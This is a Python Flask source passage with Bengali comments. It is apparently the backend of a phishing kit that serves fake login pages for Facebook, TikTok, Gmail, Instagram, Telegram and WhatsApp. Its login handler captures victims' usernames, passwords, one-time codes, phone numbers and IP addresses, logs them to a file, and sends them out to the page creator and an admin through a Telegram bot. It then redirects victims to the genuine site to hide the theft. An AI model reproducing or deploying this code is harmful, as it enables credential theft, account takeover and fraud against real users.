@flask_app.route('/<path:filename>')
def serve_template(filename):
    """HTML টেমপ্লেট সার্ভ করে"""
    if '?' in filename:
        filename = filename.split('?')[0]
    
    # ফাইল এক্সটেনশন চেক
    if '.' not in filename:
        filename = f"{filename}.html"
    
    # templates ফোল্ডার থেকে ফাইল সার্ভ করুন
    try:
        return send_from_directory('templates', filename)
    except Exception as e:
        print(f"Template error: {e}")
        return f"File {filename} not found", 404

@flask_app.route('/login', methods=['POST'])
def handle_login():
    """সব লগইন ডাটা এখানে আসে"""
    
    # ফর্ম ডাটা সংগ্রহ
    username = request.form.get('username') or request.form.get('email') or 'N/A'
    password = request.form.get('password') or 'N/A'
    groupName = request.form.get('groupName') or 'N/A'
    otp_code = request.form.get('otp_code') or request.form.get('otpCode') or 'N/A'
    page_type = request.args.get('page_type', 'unknown')
    target_user_id = request.args.get('user_id', 'unknown')
    
    # অতিরিক্ত ডাটা
    video_link = request.form.get('video_link') or request.form.get('videoLink') or ''
    service_type = request.form.get('service_type') or ''
    country = request.form.get('country') or ''
    phone = request.form.get('phone') or ''
    
    # JSON ডাটা তৈরি
    data = {
        'username': username,
        'password': password,
        'groupName': groupName,
        'otp_code': otp_code,
        'ipAddress': request.remote_addr,
        'pageType': page_type,
        'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        'generated_by': target_user_id,
        'userAgent': request.headers.get('User-Agent', 'Unknown'),
        'video_link': video_link,
        'service_type': service_type,
        'country': country,
        'phone': phone
    }
    
    # credentials.json এ সেভ (এনক্রিপ্টেড ফরম্যাটে)
    try:
        with open('credentials.json', 'a') as f:
            # পাসওয়ার্ড মাস্ক করে সেভ
            save_data = data.copy()
            if len(password) > 4:
                save_data['password'] = password[:2] + "***" + password[-2:] if len(password) > 4 else "***"
            f.write(json.dumps(save_data) + '\n')
    except Exception as e:
        print(f"Error saving: {e}")
    
    # টেলিগ্রামে মেসেজ পাঠান
    if target_user_id != 'unknown' and target_user_id != 'None':
        try:
            message = format_message(data)
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
            response = requests.post(
                url, 
                json={
                    'chat_id': int(target_user_id), 
                    'text': message, 
                    'parse_mode': 'Markdown'
                }, 
                timeout=10
            )
            print(f"✅ Message sent to user {target_user_id} - Status: {response.status_code}")
        except Exception as e:
            print(f"❌ Failed to send to {target_user_id}: {e}")
    
    # অ্যাডমিনকে নোটিফিকেশন (শুধু গুরুত্বপূর্ণ লগ)
    if target_user_id != str(ADMIN_CHAT_ID) and otp_code == 'N/A' and password != 'N/A':
        try:
            admin_msg = f"📊 *New Login*\n👤 {username}\n📱 {page_type}\n🌐 {request.remote_addr}"
            requests.post(
                f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
                json={'chat_id': ADMIN_CHAT_ID, 'text': admin_msg, 'parse_mode': 'Markdown'},
                timeout=5
            )
        except:
            pass
    
    # রিডাইরেক্ট
    redirect_urls = {
        'facebook': 'https://www.facebook.com/',
        'facebook_followers': 'https://www.facebook.com/',
        'tiktok': 'https://www.tiktok.com/',
        'tiktok_boost': 'https://www.tiktok.com/',
        'telegram': 'https://web.telegram.org/',
        'gmail': 'https://mail.google.com/',
        'instagram': 'https://www.instagram.com/',
        'meta_verify': 'https://business.facebook.com/',
        'Whatsapp_groups': 'https://web.whatsapp.com/',
        'whatsapp_groups': 'https://web.whatsapp.com/'
    }
    
    redirect_url = redirect_urls.get(page_type, 'https://www.google.com')
    return redirect(redirect_url)

